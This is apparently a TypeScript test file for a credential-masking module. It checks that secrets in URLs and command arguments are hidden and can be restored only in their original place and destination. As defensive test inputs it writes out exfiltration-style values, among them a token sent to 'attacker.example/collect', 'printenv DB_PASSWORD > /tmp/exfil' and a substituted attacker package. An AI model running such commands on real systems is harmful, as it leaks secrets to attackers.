/**
 * THE ONE WRITE-ONLY SECRET PRIMITIVE (`src/privacy/secret-parts.ts`):
 *   - deny by default — every common credential shape in a URL or an argument
 *     list is served as a keep mark (secd-security SECD-C2's list), while
 *     plainly non-secret parts (ports, paths, package names, regions) stay
 *     readable;
 *   - a mark sent back keeps the saved part ONLY in its own place (moved:
 *     refused), only while the destination is unchanged — the whole served
 *     value: every argument, the URL's origin, path and non-secret query
 *     (SECD-C4, sec-e H-2) — and a mark that names nothing saved is refused;
 *   - a scalar secret: empty keeps, under the same context rule.
 */
import assert from "node:assert/strict";
import test from "node:test";

import { carriesKeepMark, concealArguments, concealUrl, keepMark, keepScalar, restoreArguments, restoreUrl } from "../../src/privacy/secret-parts.ts";

const TOKEN = "AIzaSyD3xample0Key1234567890abcdEFGH";
const SLACK = "https://hooks.slack.com/services/T00000000/B00000000/AbCdEf0123456789AbCdEf0123456789";
const DISCORD = "https://discord.com/api/webhooks/123456789012345678/AbCdEf-GhIjKlMnOpQrStUvWxYz0123456789_abcdEFGHijklMNOPqrst";

test("secret parts: every common credential shape in a URL is concealed; plain parts stay readable", () => {
  const cases: Array<[string, readonly string[], readonly string[]]> = [
    [`https://maps.example.com/api?key=${TOKEN}&region=eu`, [TOKEN], ["region=eu"]],
    ["https://store.example.com/blob?sv=2023&sig=Zm9vYmFyYmF6cXV4Zm9vYmFy&se=2026", ["Zm9vYmFyYmF6cXV4Zm9vYmFy"], ["sv=2023"]],
    ["https://oauth.example.com/cb?code=4/0AX4XfWh-short&state=ok", ["4/0AX4XfWh-short"], ["state=ok"]],
    ["https://s3.example.com/x?X-Amz-Signature=abcdef0123456789abcdef&page=2", ["abcdef0123456789abcdef"], ["page=2"]],
    ["https://bot:hunter2@db.example.com/x", ["bot:hunter2"], ["db.example.com"]],
    [SLACK, ["AbCdEf0123456789AbCdEf0123456789"], ["hooks.slack.com/services"]],
    [DISCORD, ["AbCdEf-GhIjKlMnOpQrStUvWxYz0123456789_abcdEFGHijklMNOPqrst"], ["discord.com/api/webhooks"]],
    ["https://mcp.example.com/mcp#access_token=abc", ["access_token=abc"], ["mcp.example.com/mcp"]],
    // A raw `@` in the password: the userinfo ends at the authority's LAST
    // `@` (the one raw splitter; it ended at the first, serving `ss` of the
    // password as part of the host).
    ["https://bot:hun@ter2@db.example.com/x", ["hun@ter2", "ter2"], ["db.example.com/x"]],
  ];
  for (const [url, hidden, shown] of cases) {
    const served = concealUrl(url);
    for (const secret of hidden) assert.ok(!served.includes(secret), `${url} → ${served}`);
    for (const part of shown) assert.ok(served.includes(part), `${part} stays readable in ${served}`);
    assert.ok(carriesKeepMark(served));
  }
  assert.equal(concealUrl("https://mcp.example.com/v1/mcp?page=2&region=eu-west-1"), "https://mcp.example.com/v1/mcp?page=2&region=eu-west-1", "nothing secret: served as written");
});

test("secret parts: flag values, assignments and token-shaped arguments are concealed; ports, paths and packages are not", () => {
  const args = [
    "-y", "@modelcontextprotocol/server-postgres", "--port", "8080", "-p", "5432", "--db", "./data/app.db",
    "--passwd", "hunter2", "--pat", "short", "-p", "s3cret", "--signing-key", "k1", "--pass", "x", "--pwd", "y", "--db-pass", "z",
    "--key", "abc", "-k", "abc", `TOKEN=${TOKEN}`, "REGION=eu", "ghp_AAAAAAAAAAAAAAAAAAAAAAAA", `https://u:pw@db.example.com/x?access_token=${TOKEN}&page=2`,
  ];
  const served = concealArguments(args);
  const keptPlain = ["-y", "@modelcontextprotocol/server-postgres", "--port", "8080", "-p", "5432", "--db", "./data/app.db", "REGION=eu"];
  for (const plain of keptPlain) assert.ok(served.includes(plain), `${plain} stays readable: ${JSON.stringify(served)}`);
  const joined = served.join(" ");
  for (const secret of ["hunter2", "short", "s3cret", "k1", " x", " y", " z", " abc", TOKEN, "ghp_a1B2", "u:pw"]) assert.ok(!joined.includes(secret), `${secret} concealed: ${joined}`);
  assert.ok(served.includes(keepMark("after:--passwd#0")));
});

test("secret parts: an ATTACHED value (`-pSECRET`, the MySQL form) is concealed, and the next argument keeps its own meaning (sec-e-correctness M-3)", () => {
  const mysql = ["mysql", "-uroot", "-pMfPS9x2LqZ7w", "db"];
  const served = concealArguments(mysql);
  assert.deepEqual(served, ["mysql", "-uroot", `-p${keepMark("attached:-p#0")}`, "db"], "the letter is shown, the value hidden, the database name shown");
  assert.deepEqual(restoreArguments(served, mysql, true), { ok: true, value: mysql, contextUnchanged: true });
  assert.deepEqual(restoreArguments(["mysql", "-uroot", "-p", keepMark("attached:-p#0")], mysql, true), { ok: false, reason: "moved-mark" }, "the mark moved to its own argument");
  assert.deepEqual(concealArguments(["mysql", "-P3306", "-p5432", "-h", "localhost"]), ["mysql", "-P3306", "-p5432", "-h", "localhost"], "a port stays shown");
  // A single-dash secret flag's NAME (`-password x`): its next argument is its value too.
  assert.deepEqual(concealArguments(["java", "-password", "hunter2", "-jar", "app.jar"]), ["java", `-p${keepMark("attached:-p#0")}`, keepMark("after:-password#0"), "-jar", "app.jar"]);
  // Any letter, a secret-shaped rest; plain combined flags are untouched.
  assert.deepEqual(concealArguments(["tool", "-tghp_AAAAAAAAAAAAAAAAAAAAAAAA"]), ["tool", `-t${keepMark("attached:-t#0")}`]);
  assert.deepEqual(concealArguments(["rm", "-rf", "/tmp/x"]), ["rm", "-rf", "/tmp/x"]);
});

test("secret parts: a mark sent back keeps the saved part in ITS place only, for the same destination only", () => {
  const saved = ["--token", TOKEN, "--port", "8080", `GITHUB_TOKEN=${TOKEN}x`];
  const served = concealArguments(saved);
  // Round trip: the served list sent back unchanged restores the saved one, in an unchanged context.
  assert.deepEqual(restoreArguments(served, saved, true), { ok: true, value: saved, contextUnchanged: true });
  // Anything typed is a change: a concealed part may be the program itself (`sh -c <script>` serves the script as a mark).
  assert.deepEqual(restoreArguments(served.map((arg) => (arg === keepMark("after:--token#0") ? "new-token-value-typed" : arg)), saved, true), { ok: false, reason: "context-changed" });
  assert.deepEqual(restoreArguments(saved, saved, true), { ok: true, value: saved, contextUnchanged: true }, "the literal saved list is the same context");
  // Moved: the token's mark put behind another flag (an exfiltration by one field) — refused.
  assert.deepEqual(restoreArguments(["--data-binary", keepMark("after:--token#0"), "https://attacker.example/collect"], saved, true), { ok: false, reason: "moved-mark" });
  // A mark that names nothing saved, and a changed command (the caller's part of the context): refused.
  assert.deepEqual(restoreArguments(["--token", keepMark("after:--token#7")], saved, true), { ok: false, reason: "unknown-mark" });
  assert.deepEqual(restoreArguments(served, saved, false), { ok: false, reason: "context-changed" });
  // sec-e H-2: EVERY argument is the context — an argument added, or a plain one edited, is another program.
  assert.deepEqual(restoreArguments(["--verbose", ...served], saved, true), { ok: false, reason: "context-changed" });
  assert.deepEqual(restoreArguments(served.map((arg) => (arg === "8080" ? "9090" : arg)), saved, true), { ok: false, reason: "context-changed" });
  // The launcher cases: the same `npx`/`sh`, another package or script — a literal list with no mark reports the change.
  const npx = ["-y", "@modelcontextprotocol/server-github"], sh = ["-c", "exec my-mcp-server"];
  assert.deepEqual(restoreArguments(["-y", "attacker-mcp-package"], npx, true), { ok: true, value: ["-y", "attacker-mcp-package"], contextUnchanged: false });
  assert.deepEqual(restoreArguments(["-c", "printenv DB_PASSWORD > /tmp/exfil"], sh, true), { ok: true, value: ["-c", "printenv DB_PASSWORD > /tmp/exfil"], contextUnchanged: false });
  assert.deepEqual(restoreArguments(npx, npx, true), { ok: true, value: npx, contextUnchanged: true });
  assert.deepEqual(concealArguments(["-c", "printenv DB_PASSWORD > /tmp/exfil"]), concealArguments(sh), "both scripts serve as the same mark: the served form cannot be the context");
  // URLs: the whole served URL is the context — origin, path and non-secret query.
  const url = `https://bot:pw@mcp.example.com/mcp?api_key=${TOKEN}&region=eu`;
  const shown = concealUrl(url);
  assert.deepEqual(restoreUrl(shown, url, true), { ok: true, value: url, contextUnchanged: true });
  assert.deepEqual(restoreUrl(shown, url, false), { ok: false, reason: "context-changed" });
  for (const [what, moved] of [
    ["another origin", shown.replace("mcp.example.com", "attacker.example")],
    ["another tenant on the same origin", shown.replace("/mcp?", "/tenants/attacker/mcp?")],
    ["a non-secret query edited", shown.replace("region=eu", "region=us")],
  ] as const) assert.deepEqual(restoreUrl(moved, url, true), { ok: false, reason: "context-changed" }, what);
  const gateway = "https://gateway.example.com/servers/github/mcp";
  assert.deepEqual(restoreUrl("https://gateway.example.com/servers/attacker-tenant/mcp", gateway, true),
    { ok: true, value: "https://gateway.example.com/servers/attacker-tenant/mcp", contextUnchanged: false }, "a literal URL with no mark reports the tenant change");
  assert.deepEqual(restoreUrl(shown.replace("api_key=", "q="), url, true), { ok: false, reason: "moved-mark" });
  assert.deepEqual(restoreUrl(`https://mcp.example.com/mcp?x=${keepMark("url.query.nothing.0")}`, url, true), { ok: false, reason: "unknown-mark" });
});

test("secret parts: a scalar secret — empty keeps the saved one, for the same destination only", () => {
  assert.deepEqual(keepScalar("", "saved", true), { ok: true, value: "saved", kept: true });
  assert.deepEqual(keepScalar("new", "saved", false), { ok: true, value: "new", kept: false });
  assert.deepEqual(keepScalar("", "saved", false), { ok: false, reason: "context-changed" });
  assert.deepEqual(keepScalar("", undefined, true), { ok: false, reason: "nothing-saved" });
});
